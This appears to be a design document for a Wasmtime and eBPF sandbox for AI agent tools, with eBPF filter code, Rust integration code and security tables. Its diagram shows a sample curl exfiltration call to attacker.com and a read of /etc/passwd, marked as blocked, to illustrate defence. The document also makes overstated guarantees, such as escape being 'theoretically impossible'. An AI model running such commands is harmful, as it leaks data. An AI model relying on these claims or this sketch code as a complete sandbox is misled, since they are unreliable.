# Pillar 4: eBPF/Wasm-Driven Sandboxing

## Executive Summary

Replace Docker-based MCP tool sandboxing with **WebAssembly (Wasmtime)** for lightweight tools and **eBPF** for kernel-level policy enforcement. This provides microsecond-level isolation decisions and prevents container escape vulnerabilities.

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                    SANDBOX ARCHITECTURE COMPARISON                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  LEGACY: Docker Sandbox (SLOW, HEAVY)                                       │
│  ═══════════════════════════════════════                                    │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  Host OS                                                            │   │
│  │  ┌─────────────────────────────────────────────────────────────────┐│   │
│  │  │ Docker Daemon                                                    ││   │
│  │  │  ┌─────────────────────────────────────────────────────────────┐││   │
│  │  │  │ Container Namespace                                          │││   │
│  │  │  │  ┌────────────────────────────────────────────────────────┐ │││   │
│  │  │  │  │ App Process                                               │ │││   │
│  │  │  │  │                                                           │ │││   │
│  │  │  │  │  Startup: 500ms - 2s                                      │ │││   │
│  │  │  │  │  Memory: 50-100MB overhead                                │ │││   │
│  │  │  │  │  Kernel: Full Linux (millions of LOC)                     │ │││   │
│  │  │  │  │  Escape: Possible via kernel exploits                     │ │││   │
│  │  │  │  └────────────────────────────────────────────────────────┘ │││   │
│  │  │  └─────────────────────────────────────────────────────────────┘││   │
│  │  └─────────────────────────────────────────────────────────────────┘│   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
│  ARKAVO: eBPF/Wasm Sandbox (FAST, SECURE)                                   │
│  ═════════════════════════════════════════                                  │
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  Host OS Kernel                                                      │   │
│  │  ┌─────────────────────────────────────────────────────────────────┐│   │
│  │  │ eBPF Sandbox Layer (In-Kernel, Verified Safe)                    ││   │
│  │  │ ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐   ││   │
│  │  │ │ Network     │  │ File System │  │ System Call             │   ││   │
│  │  │ │ Filter      │  │ Filter      │  │ Interceptor             │   ││   │
│  │  │ │             │  │             │  │                         │   ││   │
│  │  │ │ Blocks SSRF │  │ Blocks      │  │ Blocks dangerous        │   ││   │
│  │  │ │ attempts    │  │ path escape │  │ syscalls                │   ││   │
│  │  │ └─────────────┘  └─────────────┘  └─────────────────────────┘   ││   │
│  │  └─────────────────────────────────────────────────────────────────┘│   │
│  │                         │                                           │   │
│  │  ┌──────────────────────▼───────────────────────────────────────┐   │   │
│  │  │ WebAssembly Runtime (Wasmtime) - Sandboxed User Space         │   │   │
│  │  │ ┌───────────────────────────────────────────────────────────┐│   │   │
│  │  │ │ Tool Code (Wasm)                                          ││   │   │
│  │  │ │                                                           ││   │   │
│  │  │ │  Startup: < 1ms (cold), < 0.1ms (warm)                    ││   │   │
│  │  │ │  Memory: 5-10MB overhead                                  ││   │   │
│  │  │ │  Capability: Limited to declared interfaces               ││   │   │
│  │  │ │  Escape: Theoretically impossible (formally verified)     ││   │   │
│  │  │ └───────────────────────────────────────────────────────────┘│   │   │
│  │  └───────────────────────────────────────────────────────────────┘   │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘


┌─────────────────────────────────────────────────────────────────────────────┐
│                    EBPF POLICY ENFORCEMENT POINTS                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  PYTHON TOOL EXECUTION (Example: Data Processing)                    │   │
│  │                                                                      │   │
│  │  Agent: "Process this CSV with pandas"                               │   │
│  │         │                                                            │   │
│  │         ▼                                                            │   │
│  │  ┌─────────────────────────────────────────────────────────────────┐  │   │
│  │  │ Python Code (in Wasm or native process)                         │  │   │
│  │  │                                                                 │  │   │
│  │  │ import pandas as pd                                             │  │   │
│  │  │ df = pd.read_csv('/data/input.csv')                             │  │   │
│  │  │                                                                 │  │   │
│  │  │ # Malicious attempt (blocked by eBPF):                         │  │   │
│  │  │ import os                                                       │  │   │
│  │  │ os.system('curl http://attacker.com/exfil')  ◄── BLOCKED!      │  │   │
│  │  │                                                                 │  │   │
│  │  │ # Network access (blocked by eBPF):                            │  │   │
│  │  │ import requests                                                 │  │   │
│  │  │ requests.get('http://api.external.com')  ◄────── BLOCKED!      │  │   │
│  │  │                                                                 │  │   │
│  │  │ # File escape (blocked by eBPF):                               │  │   │
│  │  │ open('/etc/passwd').read()  ◄─────────────────── BLOCKED!      │  │   │
│  │  │                                                                 │  │   │
│  │  │ # Allowed operations:                                           │  │   │
│  │  │ df.to_csv('/data/output.csv')  ◄──────────────── ALLOWED       │  │   │
│  │  │                                                                 │  │   │
│  │  └─────────────────────────────────────────────────────────────────┘  │   │
│  │                    │                                                  │   │
│  │                    ▼                                                  │   │
│  │  ┌─────────────────────────────────────────────────────────────────┐  │   │
│  │  │ eBPF KPROBE/TRACEPOINT                                           │  │   │
│  │  │                                                                 │  │   │
│  │  │ • Intercept sys_connect() → Check allowlist                    │  │   │
│  │  │ • Intercept sys_open() → Verify path in /data                  │  │   │
│  │  │ • Intercept sys_execve() → BLOCK all subprocess execution      │  │   │
│  │  │                                                                 │  │   │
│  │  │ Decision: ALLOW / DENY / KILL                                  │  │   │
│  │  └─────────────────────────────────────────────────────────────────┘  │   │
│  │                                                                      │   │
│  └──────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## eBPF Policy Enforcement

### Network Egress Filter (SSRF Prevention)

```c
// crates/arkavo-sandbox-ebpf/src/egress.bpf.c

#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

// Configurable allowlist (populated from userspace policy)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u32);    // IP address (network byte order)
    __type(value, __u8);   // 1 = allowed, 0 = denied
} allowed_ips SEC(".maps");

// Blocked CIDR ranges (private IPs, metadata endpoints)
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 16);
    __type(key, __u32);
    __type(value, struct cidr_block);
} blocked_ranges SEC(".maps");

struct cidr_block {
    __u32 addr;
    __u32 mask;
};

// Intercept connect() syscall
SEC("kprobe/sys_connect")
int BPF_KPROBE(trace_connect, int fd, struct sockaddr *addr, int addrlen) {
    struct sockaddr_in *sin = (struct sockaddr_in *)addr;
    
    // Only handle IPv4
    if (sin->sin_family != AF_INET) {
        return 0;
    }
    
    __u32 dest_ip = sin->sin_addr.s_addr;
    
    // Check blocked ranges first
    #pragma unroll
    for (int i = 0; i < 16; i++) {
        __u32 key = i;
        struct cidr_block *block = bpf_map_lookup_elem(&blocked_ranges, &key);
        if (!block) break;
        
        if ((dest_ip & block->mask) == (block->addr & block->mask)) {
            // Blocked range - kill the process
            bpf_printk("Arkavo: Blocked connection to private IP %x", dest_ip);
            bpf_send_signal(SIGKILL);
            return 0;
        }
    }
    
    // Check allowlist
    __u8 *allowed = bpf_map_lookup_elem(&allowed_ips, &dest_ip);
    if (!allowed) {
        // Not in allowlist - block
        bpf_printk("Arkavo: Blocked connection to unknown IP %x", dest_ip);
        bpf_send_signal(SIGKILL);
        return 0;
    }
    
    // Allowed
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

### File System Access Control

```c
// crates/arkavo-sandbox-ebpf/src/fs.bpf.c

#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <bpf/bpf_helpers.h>

// Allowed directories (populated from policy)
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 16);
    __type(key, __u32);
    __type(value, struct allowed_path);
} allowed_paths SEC(".maps");

struct allowed_path {
    char path[256];
    __u32 len;
    __u8 allow_write;
};

// Intercept openat() syscall
SEC("kprobe/sys_openat")
int BPF_KPROBE(trace_openat, int dfd, const char *filename, int flags) {
    char path[256];
    
    // Read filename from userspace
    bpf_probe_read_user_str(path, sizeof(path), filename);
    
    // Check for path traversal attempts
    if (bpf_strncmp(path, 3, "../") == 0 ||
        bpf_strncmp(path, 1, "/") == 0) {
        // Absolute path or traversal - check against allowlist
        
        __u32 key = 0;
        struct allowed_path *allowed = bpf_map_lookup_elem(&allowed_paths, &key);
        
        if (!allowed) {
            bpf_printk("Arkavo: No paths allowed, blocking %s", path);
            bpf_send_signal(SIGKILL);
            return 0;
        }
        
        // Check if path starts with allowed prefix
        if (bpf_strncmp(path, allowed->len, allowed->path) != 0) {
            bpf_printk("Arkavo: Path %s outside allowed prefix %s", 
                       path, allowed->path);
            bpf_send_signal(SIGKILL);
            return 0;
        }
        
        // Check write permissions
        if ((flags & O_WRONLY) || (flags & O_RDWR)) {
            if (!allowed->allow_write) {
                bpf_printk("Arkavo: Write denied for %s", path);
                bpf_send_signal(SIGKILL);
                return 0;
            }
        }
    }
    
    return 0;
}
```

### System Call Interception

```rust
// crates/arkavo-sandbox/src/ebpf_loader.rs

use aya::{include_bytes_aligned, Ebpf};
use aya::programs::{KProbe, Lsm};

/// eBPF-based sandbox enforcer
pub struct EbpfSandbox {
    ebpf: Ebpf,
    config: SandboxPolicy,
}

impl EbpfSandbox {
    pub async fn new(config: SandboxPolicy) -> Result<Self, SandboxError> {
        // Load eBPF bytecode
        #[cfg(debug_assertions)]
        let ebpf = Ebpf::load(include_bytes_aligned!(
            "../../target/bpfel-unknown-none/debug/arkavo-sandbox"
        ))?;
        
        #[cfg(not(debug_assertions))]
        let ebpf = Ebpf::load(include_bytes_aligned!(
            "../../target/bpfel-unknown-none/release/arkavo-sandbox"
        ))?;
        
        let mut sandbox = Self { ebpf, config };
        
        // Configure network filters
        sandbox.configure_network_filters().await?;
        
        // Configure filesystem filters
        sandbox.configure_fs_filters().await?;
        
        // Attach kprobes
        sandbox.attach_probes().await?;
        
        Ok(sandbox)
    }
    
    async fn configure_network_filters(&mut self) -> Result<(), SandboxError> {
        // Populate allowlist from policy
        let allowed_ips: HashMap<_, u32, u8> = 
            HashMap::try_from(self.ebpf.map_mut("allowed_ips")?)?;
        
        for ip in &self.config.network.allowlist {
            let ip_num = ip.parse::<u32>()?;
            allowed_ips.insert(ip_num, 1, 0).await?;
        }
        
        // Populate blocked ranges
        let blocked: Array<_, cidr_block> = 
            Array::try_from(self.ebpf.map_mut("blocked_ranges")?)?;
        
        // Block 169.254.169.254 (cloud metadata)
        blocked.set(0, cidr_block {
            addr: u32::from_be_bytes([169, 254, 169, 254]),
            mask: u32::from_be_bytes([255, 255, 255, 255]),
        }, 0)?;
        
        // Block 10.0.0.0/8
        blocked.set(1, cidr_block {
            addr: u32::from_be_bytes([10, 0, 0, 0]),
            mask: u32::from_be_bytes([255, 0, 0, 0]),
        }, 0)?;
        
        // Block 192.168.0.0/16
        blocked.set(2, cidr_block {
            addr: u32::from_be_bytes([192, 168, 0, 0]),
            mask: u32::from_be_bytes([255, 255, 0, 0]),
        }, 0)?;
        
        Ok(())
    }
    
    async fn attach_probes(&mut self) -> Result<(), SandboxError> {
        // Attach network filter
        let prog: &mut KProbe = self.ebpf
            .program_mut("trace_connect")
            .ok_or(SandboxError::ProgramNotFound)?
            .try_into()?;
        
        prog.load()?;
        prog.attach("sys_connect", 0)?;
        
        // Attach filesystem filter
        let prog: &mut KProbe = self.ebpf
            .program_mut("trace_openat")
            .ok_or(SandboxError::ProgramNotFound)?
            .try_into()?;
        
        prog.load()?;
        prog.attach("sys_openat", 0)?;
        
        Ok(())
    }
}
```

## WebAssembly Sandboxing

### Wasmtime Integration

```rust
// crates/arkavo-sandbox/src/wasm.rs

use wasmtime::{Engine, Module, Store, Instance, Func, FuncType, ValType};
use wasmtime_wasi::WasiCtxBuilder;

/// WebAssembly-based tool sandbox
pub struct WasmSandbox {
    engine: Engine,
    config: WasmSandboxConfig,
}

impl WasmSandbox {
    pub fn new(config: WasmSandboxConfig) -> Result<Self, SandboxError> {
        // Configure Wasmtime for security
        let mut wasm_config = wasmtime::Config::new();
        
        // Enable Cranelift optimizations
        wasm_config.cranelift_opt_level(wasmtime::OptLevel::Speed);
        
        // Enable memory sandboxing
        wasm_config.memory_init_cow(true);
        
        // Disable features not needed for tools
        wasm_config.wasm_threads(false);
        wasm_config.wasm_reference_types(false);
        wasm_config.wasm_simd(false);
        
        let engine = Engine::new(&wasm_config)?;
        
        Ok(Self { engine, config })
    }
    
    /// Execute tool in WebAssembly sandbox
    pub async fn execute(
        &self,
        wasm_module: &[u8],
        input: ToolInput,
    ) -> Result<ToolOutput, SandboxError> {
        // Compile module
        let module = Module::new(&self.engine, wasm_module)?;
        
        // Create limited WASI context
        let wasi = WasiCtxBuilder::new()
            // Only allow access to specific directories
            .preopened_dir(&self.config.allowed_dirs, "/data")?
            // Inherit stdout/stderr for logging
            .inherit_stdio()
            // Do NOT inherit env (security)
            .envs(&self.config.environment_vars)
            // Set resource limits
            .build();
        
        // Create store with limits
        let mut store = Store::new(&self.engine, wasi);
        
        // Set memory limit
        store.limiter(|_| ResourceLimiter {
            memory_size: self.config.memory_limit_mb * 1024 * 1024,
            table_elements: 10000,
            instances: 1,
            tables: 1,
            memories: 1,
        });
        
        // Create instance with restricted imports
        let mut linker = wasmtime::Linker::new(&self.engine);
        wasmtime_wasi::add_to_linker(&mut linker, |s| s)?;
        
        // Add custom Arkavo API (limited capabilities)
        self.add_arkavo_api(&mut linker)?;
        
        let instance = linker.instantiate(&mut store, &module)?;
        
        // Call entry point with timeout
        let entry = instance
            .get_typed_func::<(i32, i32), i32>(&mut store, "execute")?;
        
        let result = tokio::time::timeout(
            Duration::from_secs(self.config.timeout_secs),
            entry.call(&mut store, (input_ptr, input_len)),
        ).await??;
        
        // Parse output
        let output = self.read_output(&store, result)?;
        
        Ok(output)
    }
    
    /// Add Arkavo-specific API to Wasm
    fn add_arkavo_api(&self, linker: &mut Linker<WasiCtx>) -> Result<(), SandboxError> {
        // Allow tool to log (for debugging)
        linker.func_wrap(
            "arkavo",
            "log",
            |mut caller: wasmtime::Caller<'_, WasiCtx>, ptr: i32, len: i32| {
                let memory = caller.get_export("memory").unwrap().into_memory().unwrap();
                let mut buffer = vec![0u8; len as usize];
                memory.read(&caller, ptr as usize, &mut buffer).unwrap();
                let message = String::from_utf8_lossy(&buffer);
                tracing::info!("[wasm-tool] {}", message);
            },
        )?;
        
        // Allow tool to check if network is permitted
        linker.func_wrap(
            "arkavo",
            "network_allowed",
            |caller: wasmtime::Caller<'_, WasiCtx>| -> i32 {
                // Check policy - default deny
                0 // false
            },
        )?;
        
        Ok(())
    }
}
```

### Rust Tool SDK for Wasm

```rust
// crates/arkavo-tool-sdk/src/lib.rs

/// SDK for building Arkavo tools that compile to WebAssembly
#[cfg(target_arch = "wasm32")]
pub mod wasm {
    /// Entry point for Wasm tools
    #[no_mangle]
    pub extern "C" fn execute(input_ptr: i32, input_len: i32) -> i32 {
        // Read input from Wasm memory
        let input = unsafe {
            let slice = std::slice::from_raw_parts(
                input_ptr as *const u8,
                input_len as usize,
            );
            String::from_utf8_lossy(slice)
        };
        
        // Parse JSON input
        let request: ToolRequest = match serde_json::from_str(&input) {
            Ok(r) => r,
            Err(e) => return output_error(&e.to_string()),
        };
        
        // Execute tool
        let result = match execute_tool(request) {
            Ok(output) => output,
            Err(e) => return output_error(&e.to_string()),
        };
        
        // Return output pointer
        output_result(&result)
    }
    
    /// Log to Arkavo (host-provided function)
    pub fn log(message: &str) {
        extern "C" {
            fn arkavo_log(ptr: i32, len: i32);
        }
        unsafe {
            arkavo_log(message.as_ptr() as i32, message.len() as i32);
        }
    }
    
    /// Check if network access is allowed
    pub fn network_allowed() -> bool {
        extern "C" {
            fn arkavo_network_allowed() -> i32;
        }
        unsafe { arkavo_network_allowed() != 0 }
    }
}

/// Example tool using SDK
pub mod example {
    use super::wasm::*;
    
    fn execute_tool(request: ToolRequest) -> Result<ToolOutput, ToolError> {
        log("Starting CSV processing");
        
        // Network check - will return false in sandbox
        if request.requires_network && !network_allowed() {
            return Err(ToolError::NetworkNotAllowed);
        }
        
        // Process data...
        let result = process_data(&request.data)?;
        
        log("Processing complete");
        
        Ok(ToolOutput {
            data: result,
            metadata: Default::default(),
        })
    }
}
```

## Unified Sandboxing Strategy

### Decision Tree

```rust
// crates/arkavo-sandbox/src/lib.rs

/// Determine sandbox strategy based on tool characteristics
pub fn select_sandbox(
    tool: &ToolDefinition,
    policy: &SandboxPolicy,
) -> SandboxStrategy {
    // Priority 1: eBPF for all tools (kernel-level enforcement)
    // eBPF is always active as the first line of defense
    
    match tool.runtime {
        ToolRuntime::Native => {
            // Native tools get eBPF enforcement only
            // (can't easily sandbox native code beyond eBPF)
            SandboxStrategy::EbpfOnly {
                network: policy.network,
                filesystem: policy.filesystem,
            }
        }
        
        ToolRuntime::Python | ToolRuntime::Node => {
            // Interpreted languages: eBPF + process isolation
            SandboxStrategy::EbpfWithProcess {
                ebpf_policy: policy.clone(),
                process_sandbox: ProcessSandbox::new(policy),
            }
        }
        
        ToolRuntime::Wasm => {
            // WebAssembly: eBPF + Wasm sandbox (strongest isolation)
            SandboxStrategy::EbpfWithWasm {
                ebpf_policy: policy.clone(),
                wasm_config: WasmSandboxConfig::from(policy),
            }
        }
        
        ToolRuntime::Docker => {
            // Legacy: eBPF + Docker (for compatibility)
            SandboxStrategy::EbpfWithDocker {
                ebpf_policy: policy.clone(),
                docker_config: DockerConfig::from(policy),
            }
        }
    }
}

/// Unified sandbox executor
pub struct UnifiedSandbox {
    ebpf: EbpfSandbox,
    wasm: Option<WasmSandbox>,
    process: Option<ProcessSandbox>,
}

impl UnifiedSandbox {
    pub async fn execute(
        &self,
        tool: &ToolDefinition,
        input: ToolInput,
    ) -> Result<ToolOutput, SandboxError> {
        // 1. eBPF is always active (enforced by kernel)
        
        // 2. Choose execution environment
        match tool.runtime {
            ToolRuntime::Wasm => {
                // Fast path: Wasm (sub-millisecond startup)
                self.wasm
                    .as_ref()
                    .ok_or(SandboxError::WasmNotAvailable)?
                    .execute(&tool.wasm_module, input)
                    .await
            }
            
            ToolRuntime::Python => {
                // Python: Use firejail + eBPF
                self.process
                    .as_ref()
                    .ok_or(SandboxError::ProcessSandboxNotAvailable)?
                    .execute_python(tool, input)
                    .await
            }
            
            _ => {
                // Default: Process sandbox
                self.process
                    .as_ref()
                    .ok_or(SandboxError::ProcessSandboxNotAvailable)?
                    .execute(tool, input)
                    .await
            }
        }
    }
}
```

## Performance Comparison

| Metric | Docker | Firejail | Wasmtime + eBPF |
|--------|--------|----------|-----------------|
| **Cold Start** | 500-2000ms | 100-300ms | 1-5ms |
| **Warm Start** | 100-500ms | 50-100ms | 0.1-0.5ms |
| **Memory Overhead** | 50-100MB | 20-50MB | 5-10MB |
| **Kernel Attack Surface** | Large | Medium | Minimal (eBPF verified) |
| **Startup Isolation** | Namespace | Namespace | Capability-based |
| **Runtime Enforcement** | None | Limited | eBPF (kernel-level) |

## Implementation Roadmap

### Phase 1: eBPF Foundation (Weeks 1-4)

```rust
// New crate: arkavo-sandbox-ebpf

// - eBPF programs in C/Rust
// - Network egress filter
// - Filesystem access control  
// - System call whitelist

// Build with aya-rs for Rust integration
```

### Phase 2: Wasmtime Integration (Weeks 5-8)

```rust
// New crate: arkavo-sandbox-wasm

// - Wasmtime integration
// - WASI capability restrictions
// - Arkavo tool SDK
// - Compile Rust tools to Wasm target
```

### Phase 3: Unified Sandbox (Weeks 9-12)

```rust
// Refactor arkavo-mcp-tools

// - Unified sandbox selection
// - eBPF + Wasm integration
// - eBPF + process integration
// - Policy-driven configuration
```

### Phase 4: Tool Migration (Weeks 13-16)

- Rewrite high-frequency tools in Rust → Wasm
- Keep complex Python tools in eBPF+process sandbox
- Benchmark and optimize

## Security Guarantees

| Threat | eBPF Defense | Wasm Defense |
|--------|-------------|--------------|
| **SSRF** | Block connect() to private IPs | No network capability |
| **Data Exfil** | Block connect() to unknown IPs | No network capability |
| **Path Escape** | Block open() outside allowed paths | WASI preopened dirs |
| **Priv Esc** | Block setuid(), exec() | No system calls |
| **Resource Exhaustion** | rlimit enforcement | Memory/CPU limits |
| **Container Escape** | Kernel-level enforcement | No container to escape |
